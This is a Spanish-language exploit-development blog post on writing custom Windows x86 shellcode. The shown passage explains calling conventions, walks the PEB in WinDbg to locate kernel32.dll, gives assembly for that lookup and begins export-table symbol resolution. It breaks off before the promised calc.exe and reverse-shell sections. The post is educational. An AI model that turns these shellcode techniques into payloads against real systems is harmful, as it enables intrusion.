<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Custom Shellcode</title>

  <meta name="description" content="Creación manual de shellcode para Windows x86">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Custom Shellcode">
  <meta name="twitter:description" content="Creación manual de shellcode para Windows x86">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploitdevelopment/windows-user/shellcode/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Custom Shellcode">
  <meta property="og:description" content="Creación manual de shellcode para Windows x86">
  <meta property="og:image" content="/exploitdevelopment/windows-user/shellcode/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploitdevelopment/windows-user/shellcode/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Custom Shellcode" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploitdevelopment/windows-user" title="xchg2pwn" class="blog-button">Windows User Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#calling">Calling Conventions</a></li>
        <li><a href="#kernel32">Find kernel32</a></li>
        <li><a href="#symbols">Find symbols</a></li>
        <li><a href="#hash">Compute hash</a></li>
        <li><a href="#null">Null bytes</a></li>
        <li><a href="#calc">Exec calc.exe</a></li>
        <li><a href="#shell">Exec revshell</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploitdevelopment/windows-user/shellcode/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Custom Shellcode</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">En explotaciones anteriores la creación del shellcode la haciamos usando <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este post aprenderemos no solo a entender como funciona sino tambien desarrollarlo por nuestra cuenta, primero crearemos el codigo en lenguaje en <code class="language-plaintext highlighter-rouge">ensamblador</code> para despues traducirlo a una forma hexadecimal que podamos usar en un exploit, el crear un <code class="language-plaintext highlighter-rouge">shellcode</code> universal para windows ciertamente puede ser un reto asi que repasemos algunos conceptos y veamos que podemos o no usar</p>
</section>

<section class="post" id="calling">
<br><h3 class="post-title">Calling Conventions</h3><br>

<p class="plain-text">Las convenciones de llamadas definen lo que se necesita para llamar a una función:
<br>• Como se pasan los argumentos a la función
<br>• Como se prepara la pila antes de la llamada
<br>• Como se restaura la pila después de la llamada
<br><br>Por tanto es importante que se utilice la convención de la llamada correcta para la función, las funciones de la <code class="language-plaintext highlighter-rouge">API</code> de Win32 utilizan la convencion de llamadas <code class="language-plaintext highlighter-rouge">__stdcall</code> mientras que las funciones en tiempo de ejecución <code class="language-plaintext highlighter-rouge">C</code> utilizan la convención <code class="language-plaintext highlighter-rouge">__cdecl</code>, en los 2 casos los parametros se empujan a la pila en orden inverso, la diferencia es que cuanso se utiliza <code class="language-plaintext highlighter-rouge">__stdcall</code> la pila es limpiada por el callee mientras que cuando se utiliza <code class="language-plaintext highlighter-rouge">__cdecl</code> es limpilada por el caller
<p class="plain-text">Para cualquier convencion de llamada en <code class="language-plaintext highlighter-rouge">x86</code> los registros <code class="language-plaintext highlighter-rouge">eax</code>, <code class="language-plaintext highlighter-rouge">ecx</code> y <code class="language-plaintext highlighter-rouge">edx</code> se consideran volatiles lo qeu significa que no debemos confiar en que estos volveran con el mismo valor ya que pueden ser manipulados durante la llamada a una función</p>
<p class="plain-text">Las <code class="language-plaintext highlighter-rouge">syscalls</code> son funciones que proporcionan interfaz al kernel desde windows-user esto permite ejecutar funciones de bajo nivel del sistema operativo, la <code class="language-plaintext highlighter-rouge">API</code> nativa de windows es equivalente a system calls en sistemas <code class="language-plaintext highlighter-rouge">unix</code>, se trata de una interfaz expuesta a las aplicaciones en windows-user por la libreria <code class="language-plaintext highlighter-rouge">ntdll.dll</code></p>
<p class="plain-text">La API nativa de windows no esta documentada y esta oculta tras la <code class="language-plaintext highlighter-rouge">API</code> de nivel superior, las funciones a nivel de kernel se identifican a traves de <code class="language-plaintext highlighter-rouge">syscall numbers</code> sin embargo estos tienden a cambiar entre versiones y es bastante limitada, por ejemplo no hay una api de socket a traves de <code class="language-plaintext highlighter-rouge">syscalls</code> por lo que debemos evitarlas a toda costa para escribir un shellcode universal que funcione en cualquier version</p>
<p class="plain-text">Sin <code class="language-plaintext highlighter-rouge">syscalls</code> la unica opcion de comunicarnos con el kernel es la <code class="language-plaintext highlighter-rouge">API</code> de Windows que se exporta mediante librerias (<code class="language-plaintext highlighter-rouge">.dll</code>) si no estan cargadas en el proceso necesitamos cargarlas y localizar las funciones que exportan, una vez localizadas las funciones podemos llamarlas en el shellcode, la funcion <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> nos permite cargar dlls mientras <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> puede utilizarse para obtener la direccion base de una dll y <code class="language-plaintext highlighter-rouge">GetProcAddress</code> para resolver simbolos, sin embargo las direcciones no las conocemos cuando corremos el shellcode en memoria, para ello necesitamos averiguar como resolver funciones de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> y de otras librerias necesarias</p>

</section>

<section class="post" id="kernel32">
<br><h3 class="post-title">Find kernel32</h3><br>

<p class="plain-text">Entonces, shellcode necesita localizar la direccion base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, para obtener la direccion base de una dll necesitamos asegurarnos que esta en memoria en tiempo de ejecucion, afortunadamente <code class="language-plaintext highlighter-rouge">kernel32.dll</code> esta garantizado porque exporta las API basicas para la mayoria de procesos, una vez podamos obtener su direccion base y resolver simbolos podemos cargar otras librerias con <code class="language-plaintext highlighter-rouge">LoadLibraryA</code></p>
<p class="plain-text">Hay varios metodos que se pueden utilizar para encontrar la dirección base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, el método más usado por su portabilidad se basa en la estructura del bloque <code class="language-plaintext highlighter-rouge">PEB</code>, la estructura PEB es asignada por el sistema en cada proceso, podemos encontrarla en la memoria a partir de la direccion contenida en el registro <code class="language-plaintext highlighter-rouge">fs</code></p>

<p class="plain-text">En las versiones de <code class="language-plaintext highlighter-rouge">32</code> bits el registro <code class="language-plaintext highlighter-rouge">fs</code> siempre contiene un puntero al <code class="language-plaintext highlighter-rouge">TEB</code>, en el offset <code class="language-plaintext highlighter-rouge">0x30</code> del <code class="language-plaintext highlighter-rouge">TEB</code> podemos encontrar un puntero a la estructura <code class="language-plaintext highlighter-rouge">PEB</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_TEB @$teb
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : 0x012946a0 Void
   +0x030 ProcessEnvironmentBlock : 0x00d46000 _PEB</span>
</code></pre></div></div><br>

<p class="plain-text">Dentro del <code class="language-plaintext highlighter-rouge">PEB</code> hay un puntero a la estructura <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> con un offset de <code class="language-plaintext highlighter-rouge">0xc</code> que hace referencia a 3 listas enlazadas que muestren los modulos cargados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_PEB 0x00d46000
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x009b0000 Void
   +0x00c Ldr              : 0x77adeb20 _PEB_LDR_DATA</span>
</code></pre></div></div><br>

<p class="plain-text">En la estructura <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> encontramos 3 listas enlazadas con nombres descriptivos que ofrecen un ordenamiento diferente de los modulos cargado, todos ellos muestran el modulo anterior y siguiente, solo cambia el orden que usa:
<br>• <code class="language-plaintext highlighter-rouge">InLoadOrderModuleList</code>: En orden de carga
<br>• <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code>: En orden de colocación en memoria
<br>• <code class="language-plaintext highlighter-rouge">InInitializationOrderModuleList</code>: En orden de inicialización</p>

<p class="plain-text">WinDbg describe el campo <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> como una estructura <code class="language-plaintext highlighter-rouge">LIST_ENTRY</code> compuesta por 2 campos que analizaremos a continuación</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_PEB_LDR_DATA 0x77adeb20
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x2892138 - 0x289b4d0 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x2892140 - 0x289b4d8 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x2892050 - 0x2897588 ]
   +0x024 EntryInProgress  : (null) 
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null)</span>
</code></pre></div></div><br>

<p class="plain-text">Ambos campos de la estructura se utilizan habitualmente en listas doblemente enlazadas para acceder a la entrada siguiente (<code class="language-plaintext highlighter-rouge">Flink</code>) o anterior (<code class="language-plaintext highlighter-rouge">Blink</code>) de la lista</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_LIST_ENTRY (0x77adeb20 + 0x14)
 [ 0x2892140 - 0x289b4d8 ]
   +0x000 Flink            : 0x02892140 _LIST_ENTRY [ 0x2892048 - 0x77adeb34 ]
   +0x004 Blink            : 0x0289b4d8 _LIST_ENTRY [ 0x77adeb34 - 0x289b7d8 ]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al mostrar la estructura restando <code class="language-plaintext highlighter-rouge">0x8</code> de la direccion de la estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code> para llegar al principio de la estructura <code class="language-plaintext highlighter-rouge">_LDR_DATA_TABLE_ENTRY</code>, muestra que la estructura contiene un campo llamado <code class="language-plaintext highlighter-rouge">DllBase</code> que como su nombre indica contiene la dirección base del dll, tambien podemos obtener el nombre de la libreria en el campo <code class="language-plaintext highlighter-rouge">BaseDllName</code> que tiene una estructura de tipo <code class="language-plaintext highlighter-rouge">_UNICODE_STRING</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_LDR_DATA_TABLE_ENTRY poi(0x77adeb20 + 0x14 - 0x8)
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x2892040 - 0x77adeb2c ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x2892048 - 0x77adeb34 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x0 - 0x0 ]
   +0x018 DllBase          : 0x00150000 Void
   +0x01c EntryPoint       : 0x00176e90 Void
   +0x020 SizeOfImage      : 0x51000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SysWOW64\notepad.exe"
   +0x02c BaseDllName      : _UNICODE_STRING "notepad.exe"</span>
</code></pre></div></div><br>

<p class="plain-text">Al ser una lista enlazada deberiamos acceder a la siguiente entrada, que será <code class="language-plaintext highlighter-rouge">ntdll.dll</code> y como tercer valor <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, en el offset <code class="language-plaintext highlighter-rouge">0x18</code> osea <code class="language-plaintext highlighter-rouge">0x10</code> a partir de donde estamos deberiamos tener el valor <code class="language-plaintext highlighter-rouge">DllBase</code> que tendrá la base de <code class="language-plaintext highlighter-rouge">kernel32</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_LDR_DATA_TABLE_ENTRY poi(poi(0x77adeb20 + 0x14) - 0x8)
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x2897578 - 0x2892138 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x2897580 - 0x2892140 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x2897900 - 0x77adeb3c ]
   +0x018 DllBase          : 0x779b0000 Void
   +0x01c EntryPoint       : (null) 
   +0x020 SizeOfImage      : 0x1b2000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"

</span><span class="ro">0:000></span><span class="p"> dt ntdll!_LDR_DATA_TABLE_ENTRY poi(poi(poi(0x77adeb20 + 0x14)) - 0x8)
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x1294498 - 0x1293b98 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x12944a0 - 0x1293ba0 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x77adeb3c - 0x12944a8 ]
   +0x018 DllBase          : 0x77890000 Void
   +0x01c EntryPoint       : 0x778a77c0 Void
   +0x020 SizeOfImage      : 0xf0000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\System32\KERNEL32.DLL"  
   +0x02c BaseDllName      : _UNICODE_STRING "KERNEL32.DLL"</span>
</code></pre></div></div><br>

<p class="plain-text">Inciamos nuestro shellcode con un <code class="language-plaintext highlighter-rouge">int3</code> que usaremos como breakpoint, despues de ello moveremos el registro <code class="language-plaintext highlighter-rouge">esp</code> a <code class="language-plaintext highlighter-rouge">ebp</code> y restaremos <code class="language-plaintext highlighter-rouge">0x28</code>, esto emula una funcion real para que los argumentos pasados a la funcion sean accedidos facilmente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">int3
    mov </span><span class="mi">ebp</span><span class="p">, </span><span class="mi">esp                    </span><span class="c1">; new stack frame
    </span><span class="o">sub </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x28                   </span><span class="c1">; space for variables  </span>
</code></pre></div></div><br>

<p class="plain-text">Despues ejecutamos la funcion <code class="language-plaintext highlighter-rouge">.find_kernel32</code>, esta guarda en esi <code class="language-plaintext highlighter-rouge">fs:[0x30]</code> que es el puntero al <code class="language-plaintext highlighter-rouge">PEB</code>, desreferenciamos <code class="language-plaintext highlighter-rouge">esi</code> con el offset <code class="language-plaintext highlighter-rouge">0xc</code> para obtener el puntero a la estructura <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code>, finalmente desreferenciamos de nuevo <code class="language-plaintext highlighter-rouge">esi</code> ahora con el offset <code class="language-plaintext highlighter-rouge">0x14</code> para obtener la entrada de la lista <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find_kernel32</span><span class="p">:
        </span><span class="o">xor </span><span class="mi">ecx</span><span class="p">, </span><span class="mi">ecx                </span><span class="c1">; TEB structure
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">fs</span><span class="p">: </span><span class="mi">ecx </span><span class="o">+ </span><span class="mi">0x30</span><span class="p">]   </span><span class="c1">; PEB Address
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">esi </span><span class="o">+ </span><span class="mi">0xc</span><span class="p">]        </span><span class="c1">; ntdll!PebLdr
        </span><span class="o">mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">esi </span><span class="o">+ </span><span class="mi">0x14</span><span class="p">]       </span><span class="c1">; InMemoryOrderModuleList  </span>
</code></pre></div></div><br>

  <p class="plain-text">La primera instruccion <code class="language-plaintext highlighter-rouge">mov</code> guarda la primera entrada de la lista que es el binario en <code class="language-plaintext highlighter-rouge">esi</code>, después con lodsd se carga la siguiente entrada <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> utilizando el miembro <code class="language-plaintext highlighter-rouge">flink</code>, esta será <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, finalmente se mueve a <code class="language-plaintext highlighter-rouge">ebx</code> el valor <code class="language-plaintext highlighter-rouge">DllBase</code> de la siguiente entrada guardando así la base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">        mov </span><span class="mi">esi</span><span class="p">, [</span><span class="mi">esi</span><span class="p">]              </span><span class="c1">; ntdll.dll
        </span><span class="o">lodsd</span><span class="c1">                       ; kernel32.dll
        </span><span class="o">mov </span><span class="mi">ebx</span><span class="p">, [</span><span class="mi">eax</span><span class="o"> + </span><span class="mi">0x10</span><span class="p">]</span><span class="c1">       ; kernel32 base  
        </span><span class="o">ret                         </span><span class="c1">; return</span>
</code></pre></div></div><br>

<p class="plain-text">Para debuggear el shellcode facilmente simplemente crearemos un ejecutable compilando el codigo ensamblador con <code class="language-plaintext highlighter-rouge">nasm</code> y <code class="language-plaintext highlighter-rouge">ld</code> para obtener un <code class="language-plaintext highlighter-rouge">.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m i386pe -o shellcode.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos simplemente abrir el ejecutable en <code class="language-plaintext highlighter-rouge">WinDbg</code> y ejecutarlo hasta el <code class="language-plaintext highlighter-rouge">breakpoint</code> que indica que lo que esta justo despues es nuestro shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(2ecc.2ea8): Break instruction exception - code 80000003 (first chance)
eax=00bff8a4 ebx=009e6000 ecx=00d31000 edx=00d31000 esi=00d31000 edi=00d31000  
eip=00d31000 esp=00bff850 ebp=00bff85c iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
shellcode+0x1000:
00d31000 cc              int     3

</span><span class="ro">0:000></span><span class="p"> u eip Lb
shellcode+0x1000:
00d31000 cc              int     3
00d31001 89e5            mov     ebp,esp
00d31003 83ec28          sub     esp,28h
00d31006 31c9            xor     ecx,ecx
00d31008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
00d3100c 8b760c          mov     esi,dword ptr [esi+0Ch]
00d3100f 8b7614          mov     esi,dword ptr [esi+14h]
00d31012 8b36            mov     esi,dword ptr [esi]
00d31014 ad              lods    dword ptr [esi]
00d31015 8b5810          mov     ebx,dword ptr [eax+10h]
00d31018 c3              ret</span>
</code></pre></div></div><br>

<p class="plain-text">Saltemos hasta la siguiente instrucción <code class="language-plaintext highlighter-rouge">ret</code> que indica que ha salido bien y si es asi en el registro ebx deberiamos la dirección base del módulo <code class="language-plaintext highlighter-rouge">kernel32.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">pt
eax=012940b0 ebx=77890000 ecx=00000000 edx=009b1000 esi=01293ba4 edi=009b1000
eip=009b1018 esp=00fff9c0 ebp=00fff9e8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
shellcode+0x1018:
009b1018 c3              ret

</span><span class="ro">0:000> </span><span class="p">r ebx
ebx=77890000

</span><span class="ro">0:000> </span><span class="p">lm m kernel32
Browse full module list
start    end        module name
77890000 77980000   KERNEL32   (deferred)</span>
</code></pre></div></div><br>

</section>

<section class="post" id="symbols">
<br><h3 class="post-title">Find symbols</h3><br>

<p class="plain-text">Una vez obtuvimos la direccion de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> el siguiente paso es resolver las API exportadas por el modulo, comenzaremos por resolver la dirección de la función <code class="language-plaintext highlighter-rouge">TerminateProcess</code> utilizando la <code class="language-plaintext highlighter-rouge">Export Directory Table</code> para encontrar su dirección</p>
<p class="plain-text">Usar la <code class="language-plaintext highlighter-rouge">Export Directory Table</code> es la forma segura de resolver simbolos de las dll, las dlls que exportan funciones tienen una tabla que contiene informacion como:
<br>• Numero de simbolos exportados
<br>• RVA del array de export-functions
<br>• RVA del array de export-names
<br>• RVA del array de export-ordinals</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef struct </span><span class="na">_IMAGE_EXPORT_DIRECTORY </span><span class="p">{
    </span><span class="no">DWORD   </span><span class="p">Characteristics;
    </span><span class="no">DWORD   </span><span class="p">TimeDateStamp;
    </span><span class="no">WORD    </span><span class="p">MajorVersion;
    </span><span class="no">WORD    </span><span class="p">MinorVersion;
    </span><span class="no">DWORD   </span><span class="p">Name;
    </span><span class="no">DWORD   </span><span class="p">Base;
    </span><span class="no">DWORD   </span><span class="p">NumberOfFunctions;
    </span><span class="no">DWORD   </span><span class="p">NumberOfNames;
    </span><span class="no">DWORD   </span><span class="p">AddressOfFunctions;     </span><span class="c1">// RVA from base of image  
    </span><span class="no">DWORD   </span><span class="p">AddressOfNames;         </span><span class="c1">// RVA from base of image  
    </span><span class="no">DWORD   </span><span class="p">AddressOfNameOrdinals;  </span><span class="c1">// RVA from base of image  
</span><span class="p">};</span>
</code></pre></div></div><br>

<p class="plain-text">Para resolver un simbolo por su nombre empezaremos por la lista <code class="language-plaintext highlighter-rouge">AddressOfNames</code> cada nombre tendra una entrada e indice unicos en la lista, una vez encontramos el nombre del simbolo en el indice <code class="language-plaintext highlighter-rouge">i</code> de la lista <code class="language-plaintext highlighter-rouge">AddressOfNames</code> podemos utilizar el indice en la lista <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code>, despues de esto la entrada en la lista <code class="language-plaintext highlighter-rouge">AddressOfNameOrdinals</code> en el indice <code class="language-plaintext highlighter-rouge">i</code> contendra un valor que servira como nuevo indice, encontraremos la <code class="language-plaintext highlighter-rouge">Relative Virtual Address (RVA)</code> de la funcion, podemos convertirla en una <code class="language-plaintext highlighter-rouge">Virtual Memory Address (VMA)</code> añadiendo la direccion base del dll</p>
<p class="plain-text">El <code class="language-plaintext highlighter-rouge">tamaño</code> del shellcode es importante, tenemos que optimizar el algoritmo de busqueda para los nombres de simbolos que necesitamos, para ello utilizaremos una funcion <code class="language-plaintext highlighter-rouge">hash</code> que transforma una cadena en un hash de apenas un <code class="language-plaintext highlighter-rouge">dword</code>, esto nos permitira reutilizar las instrucciones para cualquier nombre de simbolo</p>

<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">.find_function</code> guarda los valores en la pila usando <code class="language-plaintext highlighter-rouge">pushad</code> para restaurarlos despues incluso si se modifican, se almacena la direccion base con el offset <code class="language-plaintext highlighter-rouge">0x3c</code> en <code class="language-plaintext highlighter-rouge">eax</code>, en este offset se encuentra el offset de la cabecera <code class="language-plaintext highlighter-rouge">PE</code>, luego se utilizar el valor en <code class="language-plaintext highlighter-rouge">eax</code> y se añade a la direccion base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> junto con un offset estatico de <code class="language-plaintext highlighter-rouge">0x78</code> y se almacena el valor desreferenciado en <code class="language-plaintext highlighter-rouge">edi</code>, se usa un offset de <code class="language-plaintext highlighter-rouge">0x78</code> porque es la ubicacion donde podemos encontrar el <code class="language-plaintext highlighter-rouge">RVA</code> de la <code class="language-plaintext highlighter-rouge">Export Directory Table</code>, esta se convierte en una <code class="language-plaintext highlighter-rouge">VMA</code> sumando la direccion base</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find_function</span><span class="p">:
        </span><span class="o">pusha                       </span><span class="c1">; save all registers
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">ebx </span><span class="o">+ </span><span class="mi">0x3c</span><span class="p">]       </span><span class="c1">; RVA to PE signature
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, [</span><span class="mi">ebx</span><span class="o"> + </span><span class="mi">eax </span><span class="o">+ </span><span class="mi">0x78</span><span class="p">] </span><span class="c1">; RVA of Export Table
        </span><span class="o">add </span><span class="mi">edi</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Export Table</span>
</code></pre></div></div><br>

<p class="plain-text">Almacenamos el VMA con un offset de <code class="language-plaintext highlighter-rouge">0x18</code> en <code class="language-plaintext highlighter-rouge">ecx</code> este es el offset del campo <code class="language-plaintext highlighter-rouge">NumberOfName</code> que contiene el numero de simbolos exportados, por lo que podemos usar el valor en <code class="language-plaintext highlighter-rouge">ecx</code> como contador para analizar la lista <code class="language-plaintext highlighter-rouge">AddressOfNames</code>, movelos el valor que apunta <code class="language-plaintext highlighter-rouge">edi</code> y un offset de <code class="language-plaintext highlighter-rouge">0x20</code> del campo <code class="language-plaintext highlighter-rouge">AddressOfNames</code> a <code class="language-plaintext highlighter-rouge">eax</code>, como se trata de un <code class="language-plaintext highlighter-rouge">RVA</code> añadimos la direccion base de <code class="language-plaintext highlighter-rouge">kernel32.dll</code> para obtener el <code class="language-plaintext highlighter-rouge">VMA</code>, luego guardamos el <code class="language-plaintext highlighter-rouge">VMA</code> de <code class="language-plaintext highlighter-rouge">AddressOfNames</code> en una variable en <code class="language-plaintext highlighter-rouge">ebp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">        mov </span><span class="mi">ecx</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x18</span><span class="p">]       </span><span class="c1">; NR of Names
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">edi </span><span class="o">+ </span><span class="mi">0x20</span><span class="p">]       </span><span class="c1">; RVA of Name Pointer Table  
        </span><span class="o">add </span><span class="mi">eax</span><span class="p">, </span><span class="mi">ebx                </span><span class="c1">; Name Pointer Table
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">ebp </span><span class="o">- </span><span class="mi">0x4</span><span class="p">], </span><span class="mi">eax        </span><span class="c1">; var4 = Name Pointer Table  </span>
</code></pre></div></div><br>

